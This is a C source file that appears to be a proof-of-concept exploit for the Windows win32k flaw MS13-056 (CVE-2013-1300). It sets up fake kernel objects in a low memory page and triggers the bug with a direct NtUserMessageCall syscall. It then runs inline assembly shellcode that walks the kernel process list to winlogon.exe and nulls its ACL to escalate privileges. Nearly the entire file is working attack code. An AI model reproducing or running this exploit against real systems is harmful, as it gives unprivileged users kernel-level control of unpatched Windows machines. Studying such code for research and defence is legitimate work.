#include "exploit.h"

HWND ansiWindow = NULL;
HWND unicodeWindow = NULL;
HWND kernelHandle = NULL;
ULONG_PTR addr = 0x00200000;
ULONG_PTR shared = NULL;
HANDLE mutex = NULL;
BOOL success = FALSE;

// http://j00ru.vexillium.org/win32k_syscalls/ WinXP SP2  0x11cc  WIn7 SP0 0x11ea
#define __NR_NtUserMessageCall 0x11ea //0x11ea

#define BUFFERSIZE 8

PSHAREDINFO LocateSharedInfo()
{
	ULONG i;
	PSHAREDINFO gSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandle("USER32.dll"), "gSharedInfo");
	ULONG_PTR pfnUserRegisterWowHandlers = (ULONG_PTR)GetProcAddress(GetModuleHandle("USER32.dll"), "UserRegisterWowHandlers");

	// Win7 only
	return (PSHAREDINFO)GetProcAddress(GetModuleHandle("USER32.dll"), "gSharedInfo");

	if (pfnUserRegisterWowHandlers == NULL)
		return NULL;

        for (i = pfnUserRegisterWowHandlers; 
             i <= pfnUserRegisterWowHandlers +0x250; 
             ++i )
        {
            if (0x40c7 == *(WORD*)i && 
                0xb8 == *(BYTE*)(i + 7))
            {
                return (PSHAREDINFO)(*(DWORD*)(i + 8));
            }
        }
}

HWND GetKernelHandle(HWND hwnd)
{
	HWND kernelWindowHandle;
	ULONG i;
	HMODULE hUser32;
	PSHAREDINFO pSharedInfo;
	PSERVERINFO pServerInfo;
	HANDLEENTRY *UserHandleTable;

	//http://volatility-labs.blogspot.co.uk/2012/09/movp-33-analyzing-user-handles-and.html
	hUser32 = GetModuleHandle("USER32.dll");
	printf("[*] User32 @ %#p\r\n", hUser32);
	pSharedInfo = LocateSharedInfo();
	
	if (pSharedInfo == NULL)
	{
		printf("[-] Unable to locate SharedInfo");
		return NULL;
	} else {
		printf("[*] SharedInfo @ %#p\r\n", pSharedInfo);
	}

	UserHandleTable = pSharedInfo->aheList;
	printf("[*] aheList @ %#p\r\n", UserHandleTable);

	pServerInfo = pSharedInfo->psi;
	printf("[*] pServerInfo @ %#p\r\n", pServerInfo);
	printf("[*] Handle Count: %d\r\n", pServerInfo->cHandleEntries);
	// printf("User Delta 0x%p\r\n", pSharedInfo->ulSharedDelta); Not used

	for(i = 0; i < pServerInfo->cHandleEntries; i++ ) 
	{
		__try
		{
			// http://www.mista.nu/research/mandt-win32k-slides.pdf
			kernelWindowHandle = (HWND)(i | (UserHandleTable[i].wUniq << 0x10));
			if( kernelWindowHandle == hwnd )
			{
				kernelWindowHandle = (HWND)UserHandleTable[i].phead;
				printf("[+] Kernel Window Handle found @ %#p\r\n", kernelWindowHandle);
				return kernelWindowHandle;
			}
		}
		__except(EXCEPTION_EXECUTE_HANDLER) {}
    }

	return NULL;
}

__declspec(noinline) int Shellcode()
{
	//return MessageBoxA(NULL,"Boom","boom",0);
	__asm {
		mov eax, kernelHandle // WND - Which window? Check this
		mov eax, [eax+8] // THREADINFO
		mov eax, [eax] // ETHREAD
		mov eax, [eax+0x150] // KPROCESS
		mov eax, [eax+0xb8] // flink
		procloop:
		lea edx, [eax-0xb8] // KPROCESS
		mov eax, [eax]
		add edx, 0x16c // module name
		cmp dword ptr [edx], 0x6c6e6977 // “winl” for winlogon.exe
		jne procloop
		sub edx, 0x170
		mov dword ptr [edx], 0x0 // NULL ACL
	}
}

__declspec(noinline) BOOL KernelMode()
{
	WORD um= 0;
	__asm {
		mov ax, cs
		mov um, ax
	}
	return !(um == 0x1b);
}

__declspec(naked) __declspec(noinline) NTSTATUS _NtUserMessageCall(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam, ULONG_PTR ResultInfo, DWORD dwType, BOOL Ansi) {
	__asm
	{
		mov eax, __NR_NtUserMessageCall // API Address
		mov edx, 0x7FFE0300				// pKiFastSystemCall
		call DWORD PTR DS:[EDX]
		retn 0x1c						// numArgs  * 4
	}
}

LRESULT APIENTRY AnsiWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	// Our buffer in memory is reversed when it is overwriting the pointer
	// 1: kd> dd 0xFE47A8E8                   * We want our value here
	// fe47a8e8  00420041 00440043 00460045 00480047
	char address[BUFFERSIZE+1] = "AAAAAA\0X";

	switch (uMsg)
	{
	case WM_CREATE:
		printf("\tAnsi Window created %#p\t\t\t\t[*]\r\n", hwnd);
		break;
	case WM_GETTEXT:
		printf("\tReceived exploit msg: Max Buffer %i -> %#p\t[*]\r\n", wParam, lParam);
		if (wParam != 16)
		{
				printf("\tBuffer size is incorrect for exploitation\t\t[!]\r\n\tProbably patched, exiting...\t\t\t\t[!]\r\n");
				getchar();
				ExitProcess(0);
		}
		address[7] = (char)(addr >> 16);
		memcpy((void *)lParam, address, BUFFERSIZE); // Purposely copy the end \0
		return BUFFERSIZE;
	default:
		//printf("Default Ansi Handler! 0x%x\r\n",uMsg);
		return DefWindowProcA(hwnd, uMsg, wParam, lParam);
	}
}

LRESULT APIENTRY UnicodeWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_NULL:
		printf("[*] Checking for success...");
		success = KernelMode();
		if (success)
		{
			printf(" yey!\r\n");
			printf("[+] Running shellcode...\r\n");
			Shellcode();
		} else {
			printf(" failed\r\n");
		}
		break;
	case WM_CREATE:
		printf("[*] Unicode Kernel Window Created %#p\r\n", hwnd);
		break;
	default:
		//printf("Default Unicode Handler! 0x%x\r\n",uMsg);
		return DefWindowProcW(hwnd, uMsg, wParam, lParam);
	}
}

DWORD WINAPI ansiThread( LPVOID lpParam )
{
	const char lpcszClassName [] = "ansiClass";
	WNDCLASSEXA WindowClassExa;
	HINSTANCE hInstance = GetModuleHandle(NULL);

	printf("\tANSI Thread: Waiting for mutex...\t\t\t[*]\r\n");
	WaitForSingleObject(mutex, INFINITE);

	ZeroMemory(&WindowClassExa, sizeof(WNDCLASSEXA));
	WindowClassExa.cbSize = sizeof(WNDCLASSEXA);
	WindowClassExa.lpfnWndProc = AnsiWndProc;
	WindowClassExa.hInstance = hInstance;
	WindowClassExa.lpszClassName = lpcszClassName;

	if (RegisterClassExA(&WindowClassExa) != 0)
	{
		ansiWindow = CreateWindowExA(0, lpcszClassName, "ANSI Window", 0, 0, 0, 0, 0, unicodeWindow, NULL, hInstance, NULL);
		if (ansiWindow == NULL)
			UnregisterClassA(lpcszClassName, hInstance);
	}

	printf("\tANSI Thread: Releasing mutex...\t\t\t\t[*]\r\n");
	ReleaseMutex(mutex);

	printf("\tANSI Thread: Waiting for message...\t\t\t[*]\r\n");
	while (TRUE)
	{
		GetMessageA(NULL, NULL, 0, 0);
	}
}

int	exploit()
{
	wchar_t lpcszClassName [] = L"unicodeClass";
	WNDCLASSEXW  WindowClassEx;
	HINSTANCE hInstance = GetModuleHandle(NULL);
	HANDLE hDevice;
	SYSTEM_INFO SystemInfo;
	ULONG Size;
	HMODULE hNtDLL;
	HRESULT res;

	// Fake Kernel Objects
	ULONG_PTR pUsrQuotaBlock;
	ULONG_PTR pUsrEprocessOffset;

	// Thread
	HANDLE  hThread;
	DWORD   dwThreadId;
	ThreadData threadData;

	printf("--- MS13-056 | CVE-2013-1300 Implementation ---\r\n\r\n");

	GetSystemInfo(&SystemInfo);
	Size = SystemInfo.dwPageSize;
	hNtDLL = GetModuleHandle("ntdll.dll");
	printf("[*] NtDLL @ %#p\r\n", hNtDLL);
	NtAllocateVirtualMemory = GetProcAddress(hNtDLL, "NtAllocateVirtualMemory");
	printf("[*] NtAllocateVirtualMemory @ %#p\r\n", NtAllocateVirtualMemory);

	while ((NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &Size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)) != S_OK)
	{
		printf("[-] Failed to allocate addr %#p \r\n", addr);
		addr += SystemInfo.dwPageSize*16;
	}

	printf("[+] Allocated Page @ %#p\r\n", addr);
	if ((addr & 0xff00ff00) > 0)
	{
		printf("[!] Invalid exploitation address, exiting...");
		return;
	}

	ZeroMemory(&WindowClassEx, sizeof(WNDCLASSEXW));
	WindowClassEx.cbSize = sizeof(WNDCLASSEXW);
	WindowClassEx.lpfnWndProc = UnicodeWndProc;
	WindowClassEx.hInstance = hInstance;
	WindowClassEx.lpszClassName = lpcszClassName;

	if (RegisterClassExW(&WindowClassEx) != 0)
	{
		// Create a message-only window
		unicodeWindow = CreateWindowExW(0, lpcszClassName, L"KernelWindow", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
		if (unicodeWindow == NULL)
		{
			UnregisterClassW(lpcszClassName, hInstance);
			printf("[!] Unable to Create Window, exiting...\r\n");
			return;
		}
	} else {
		printf("[!] Unable to Register Class, exiting...\r\n");
		return;
	}

	printf("[*] Kernel class registered @ %#p\r\n", &WindowClassEx);
	printf("[*] Kernel window created @ %#p\r\n", unicodeWindow);

	mutex = CreateMutexA(NULL, FALSE, NULL);

	hThread = CreateThread( 
            NULL,                   // default security attributes
            0,                      // use default stack size  
            ansiThread,       // thread function name
            &threadData,          // argument to thread function 
            0,                      // use default creation flags 
            &dwThreadId);

	if (hThread == NULL)
	{
		printf("[!] Failed to create thread, exiting...\r\n");
		return;
	}

	printf("[*] Main Thread: Waiting for mutex...\r\n");
	Sleep(100); // Let other thread get started and grab mutex -- better ways to do this I'm sure.
	WaitForSingleObject(mutex, INFINITE);

	// Set up our fake kernel objects
	kernelHandle = GetKernelHandle(ansiWindow);
	// handle + Offset in win32k!tagWND - Offset in EPROCESS_QUOTA_BLOCK
	// 0x14 - 0x30 -> 0x24
	pUsrQuotaBlock = (ULONG_PTR)((ULONG_PTR)kernelHandle - (ULONG_PTR)0x24);
	pUsrEprocessOffset = (ULONG_PTR)((ULONG_PTR)addr + (ULONG_PTR)0xd4);
	printf("[*] EPROCESS_QUOTA_BLOCK @ %#p\r\n", pUsrQuotaBlock);
	// Place Pointer at EPROCESS+0xd4...
	memcpy((void*)pUsrEprocessOffset, &pUsrQuotaBlock, sizeof(ULONG_PTR));

	printf("[*] Main Thread: Releasing mutex...\r\n");
	ReleaseMutex(mutex);
	printf("[*] Press enter to trigger vulnerability...\r\n");
	getchar();

	shared = (ULONG_PTR)VirtualAlloc(NULL, 0x1000,MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	printf("[*] Shared memory @ %#p\r\n",shared);

	do 
	{
		_NtUserMessageCall(
			ansiWindow, // HWND (nb User Handle not Kernel Handle)
			WM_GETTEXT, // Msg
			0x8,		// WPARAM Buffer Size
			shared,		// LPARAM User buffer
			0x0,		// PTR ResultInfo
			0x2b3,		// Type FNID_SENDMESSAGEWTOOPTION http://doxygen.reactos.org/dd/d79/include_2ntuser_8h_source.html#l00713 // 0x02B1  - causes crash on XP
			0x2			// BOOL!!! Ansi
		);
		// Check for success...
		SendMessageW(unicodeWindow, WM_NULL, NULL, NULL);
	} while (!success);

	printf("[*] Press enter to exit\r\n");
	CloseHandle(hThread);
	CloseHandle(mutex);
	getchar();
}

int	main(int arc, char **argv)
{
	exploit();
}